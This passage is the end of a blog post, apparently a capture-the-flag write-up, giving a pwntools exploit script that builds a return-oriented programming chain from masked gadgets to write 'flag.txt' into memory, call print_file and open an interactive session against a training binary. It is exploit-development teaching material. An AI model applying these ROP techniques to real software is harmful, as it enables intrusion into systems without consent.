</span></span><span style="display:flex;"><span>                set_bits <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>
</span></span><span style="display:flex;"><span>            mask_offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        set_bits <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">16</span> <span style="color:#f92672">-</span> len(set_bits))
</span></span><span style="display:flex;"><span>        needed_bytes<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(reversed(set_bits)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [int(u16(unbits((bit)), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)) <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> needed_bytes]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## get da banner</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ::::::::::::::::::::::::::: setup :::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>    data_section <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>data_start
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.data starts @</span><span style="color:#e6db74">{</span>hex(data_section)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>    pop_ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080485bb</span>            <span style="color:#75715e"># pop ebp; ret</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># mov eax, ebp; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;</span>
</span></span><span style="display:flex;"><span>    pext_edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048543</span>           <span style="color:#75715e"># ^</span>
</span></span><span style="display:flex;"><span>    binance_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048555</span>     <span style="color:#75715e"># xchg   BYTE PTR [ecx],dl</span>
</span></span><span style="display:flex;"><span>    pop_ecx_bswap <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048558</span>      <span style="color:#75715e"># pop ecx ; bswap ecx ; ret</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    mask_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb0bababa</span>              <span style="color:#75715e"># from questionableGadgets</span>
</span></span><span style="display:flex;"><span>    target_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>    target_bytes <span style="color:#f92672">=</span> bruteforce_mask_value(mask_bytes, target_str)
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;target bytes: </span><span style="color:#e6db74">{</span>target_bytes<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> offset, byte <span style="color:#f92672">in</span> enumerate(target_bytes):
</span></span><span style="display:flex;"><span>        rop<span style="color:#f92672">.</span>raw([
</span></span><span style="display:flex;"><span>            pop_ebp,
</span></span><span style="display:flex;"><span>            byte,
</span></span><span style="display:flex;"><span>            pext_edx,
</span></span><span style="display:flex;"><span>            pop_ecx_bswap,
</span></span><span style="display:flex;"><span>            pack(data_section <span style="color:#f92672">+</span> offset, endianness<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>),
</span></span><span style="display:flex;"><span>            binance_gadget
</span></span><span style="display:flex;"><span>        ])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    rop<span style="color:#f92672">.</span>print_file(data_section)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat({
</span></span><span style="display:flex;"><span>        cyclic_find(<span style="color:#e6db74">&#39;laaa&#39;</span>): rop<span style="color:#f92672">.</span>chain()
</span></span><span style="display:flex;"><span>    })
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellit</span>
</span></span><span style="display:flex;"><span>    proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>
            </div>
        </article>

        <hr />

        
        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://cybernetic.coffee/tags/hacking/">hacking</a></span>
        <span class="tag"><a href="https://cybernetic.coffee/tags/pentesting/">pentesting</a></span>
        <span class="tag"><a href="https://cybernetic.coffee/tags/pwntools/">pwntools</a></span>
        <span class="tag"><a href="https://cybernetic.coffee/tags/exploit-development/">Exploit Development</a></span>
        
    </p>



            <p>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
                    <polyline points="14 2 14 8 20 8"></polyline>
                    <line x1="16" y1="13" x2="8" y2="13"></line>
                    <line x1="16" y1="17" x2="8" y2="17"></line>
                    <polyline points="10 9 9 9 8 9"></polyline>
                </svg>
                1045 Words
            </p>
  		</div>
        


        
            
                <div class="pagination">
                    <div class="pagination__title">
                        <span class="pagination__title-h"></span>

                    </div>

                    <div class="pagination__buttons">
                        
                        <span class="button previous">
                      <a href="https://cybernetic.coffee/blog/reversing-34-binaries/">
                        <span class="button__icon">←</span>
                        <span class="button__text">Reversing 31 Binaries for No Fun and Regret</span>
                      </a>
                    </span>
                        

                        
                            <span class="button next">
                              <a href="https://cybernetic.coffee/blog/basic-stack-based-overflows/">
                                <span class="button__text">Basic Stack Based Overflows</span>
                                <span class="button__icon">→</span>
                              </a>
                            </span>
                        
                    </div>
                </div>
            
        

    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Hacked together with &#10084; by <a href="https://github.com/Angus-C-git">Angus C</a> <i class='fas fa-ghost'></i> </span>
          </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.755e4cf350f154c0fee20aa6a1b7fa2b35fcbeaaf4cc62ef45531b19ae1fd43e5ed19c3c3bbf522045953eaef03e1cb96a64a636782486a3aa0b0563d0ef5406.js" integrity="sha512-dV5M81DxVMD&#43;4gqmobf6KzX8vqr0zGLvRVMbGa4f1D5e0Zw8O79SIEWVPq7wPhy5amSmNngkhqOqCwVj0O9UBg=="></script>



    </body>
</html>
